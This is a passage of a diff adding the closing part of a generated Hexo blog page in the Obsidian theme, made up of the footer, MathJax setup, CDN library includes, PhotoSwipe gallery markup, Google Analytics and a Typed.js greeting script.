+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
